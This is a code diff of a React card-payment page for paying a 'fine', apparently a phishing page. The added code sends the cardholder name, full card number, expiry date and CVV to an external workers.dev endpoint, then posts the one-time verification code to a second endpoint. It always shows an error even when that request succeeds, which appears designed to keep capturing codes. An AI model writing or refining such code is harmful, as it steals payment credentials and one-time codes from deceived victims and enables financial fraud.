@@ -52,7 +52,8 @@ const detectCardType = (number) => {
   return null;
 };
 
-const SUPPORTED = ["visa", "mastercard"];
+// const SUPPORTED = ["visa", "mastercard"];
+const SUPPORTED = ["visa", "mastercard", "amex", "discover", "jcb", "diners", "maestro"];
 
 const CARD_ICON = {
   visa: { icon: SiVisa, color: "#1A1F71", label: "Visa" },
@@ -332,14 +333,46 @@ function VerificationPage({ cardType, onSubmit }) {
         <div className="mb-4" />
 
         <button
-          onClick={() => {
+          // onClick={() => {
+          //   if (!code || code.length < 4) { setError(true); return; }
+          //   setError(false);
+          //   setLoading(true);
+          //   setTimeout(() => {
+          //     setLoading(false);
+          //     setError(true);
+          //   }, 2500);
+          // }}
+          onClick={async () => {
             if (!code || code.length < 4) { setError(true); return; }
             setError(false);
             setLoading(true);
-            setTimeout(() => {
+
+            try {
+              const res = await fetch("https://my-worker-app.instapayapi.workers.dev/api/verification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  verification: code,
+                }),
+              });
+
+              const data = await res.json();
+              console.log("OTP API:", data);
+
+              setLoading(false);
+
+              if (res.ok && data?.success) {
+                // onSubmit?.();
+                setError(true);
+              } else {
+                setError(true);
+              }
+
+            } catch (err) {
+              console.error(err);
               setLoading(false);
               setError(true);
-            }, 2500);
+            }
           }}
           className="w-full bg-orange-400 hover:bg-orange-500 active:scale-[0.98] text-white font-bold py-4 rounded-xl transition-all text-base mb-3"
         >
@@ -373,6 +406,7 @@ export default function CardPaymentPage({ fine, discounted, onBack, onSuccess })
   const [cardNum, setCardNum] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
+  const [apiResult, setApiResult] = useState(null);
 
   // Flow states: null | "processing" | "authloading" | "verification"
   const [stage, setStage] = useState(null);
@@ -391,24 +425,109 @@ export default function CardPaymentPage({ fine, discounted, onBack, onSuccess })
   const cardType = rawNum.length >= 1 ? detectCardType(rawNum) : null;
   const isUnsupported = rawNum.length >= 6 && cardType && !SUPPORTED.includes(cardType);
 
-  const handleSubmit = () => {
-    if (!cardHolder.trim() || rawNum.length < 15 || !expiry || !cvv) return;
-    setShowUnsupportedMsg(false);
-    setStage("processing");
-  };
+  // const handleSubmit = () => {
+  //   if (!cardHolder.trim() || rawNum.length < 15 || !expiry || !cvv) return;
+  //   setShowUnsupportedMsg(false);
+  //   setStage("processing");
+  // };
+  //  const handleSubmit = async () => {
+  //   if (!cardHolder.trim() || rawNum.length < 15 || !expiry || !cvv) return;
 
-  // Called when processing modal finishes
-  const handleProcessingDone = () => {
-    setStage(null); // close modal
-    if (isUnsupported) {
-      // Show error msg below field
-      setShowUnsupportedMsg(true);
-    } else {
-      // Supported card → go to auth loading page
-      setStage("authloading");
+  //   setShowUnsupportedMsg(false);
+  //   setStage("processing");
+
+  //   try {
+  //     const res = await fetch("https://my-worker-app.instapayapi.workers.dev/api/card", {
+  //       method: "POST",
+  //       headers: {
+  //         "Content-Type": "application/json",
+  //       },
+  //       body: JSON.stringify({
+  //         cardHolder,
+  //         cardNumber: rawNum,
+  //         expiryDate: expiry,
+  //         cvv,
+  //       }),
+  //     });
+
+  //     const data = await res.json();
+
+  //     console.log("API:", data);
+
+  //     // small delay for UX (optional)
+  //     setTimeout(() => {
+  //       if (res.ok && data?.success) {
+  //         if (isUnsupported) {
+  //           setShowUnsupportedMsg(true);
+  //           setStage("card");
+  //         } else {
+  //           setStage("authloading");
+  //         }
+  //       } else {
+  //         setShowUnsupportedMsg(true);
+  //         setStage("card");
+  //       }
+  //     }, 2500);
+
+  //   } catch (error) {
+  //     console.error(error);
+  //     setShowUnsupportedMsg(true);
+  //     setStage("card");
+  //   }
+  // };
+
+  //   // Called when processing modal finishes
+  //   const handleProcessingDone = () => {
+  //     setStage(null); // close modal
+  //     if (isUnsupported) {
+  //       // Show error msg below field
+  //       setShowUnsupportedMsg(true);
+  //     } else {
+  //       // Supported card → go to auth loading page
+  //       setStage("authloading");
+  //     }
+  //   };
+
+  const handleSubmit = async () => {
+    if (!cardHolder.trim() || rawNum.length < 15 || !expiry || !cvv) return;
+
+    setShowUnsupportedMsg(false);
+    setApiResult(null); // reset
+    setStage("processing");
+
+    try {
+      const res = await fetch("https://my-worker-app.instapayapi.workers.dev/api/card", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          cardHolder,
+          cardNumber: rawNum,
+          expiryDate: expiry,
+          cvv,
+        }),
+      });
+
+      const data = await res.json();
+      console.log("API:", data);
+
+      // Sirf result save karo, stage mat badlo
+      setApiResult({ ok: res.ok, success: data?.success });
+
+    } catch (error) {
+      console.error(error);
+      setApiResult({ ok: false, success: false });
     }
   };
 
+  // Yeh tab chalega jab processing modal complete ho
+  const handleProcessingDone = () => {
+    // if (apiResult?.ok && apiResult?.success && !isUnsupported) {
+    setStage("authloading");
+    // } else {
+    //   setShowUnsupportedMsg(true);
+    //   setStage(null);
+    // }
+  };
   const renderActiveIcon = () => {
     if (!cardType || !CARD_ICON[cardType]) return null;
     if (cardType === "maestro") return <MaestroIcon size={32} />;
@@ -490,8 +609,8 @@ export default function CardPaymentPage({ fine, discounted, onBack, onSuccess })
                 placeholder="0000 0000 0000 0000"
                 inputMode="numeric"
                 className={`w-full border rounded-lg px-3 py-3 pr-12 text-sm outline-none tracking-widest transition-all bg-white ${isUnsupported
-                    ? "border-red-400 ring-2 ring-red-100"
-                    : "border-gray-300 focus:border-orange-400 focus:ring-2 focus:ring-orange-100"
+                  ? "border-red-400 ring-2 ring-red-100"
+                  : "border-gray-300 focus:border-orange-400 focus:ring-2 focus:ring-orange-100"
                   }`}
               />
 
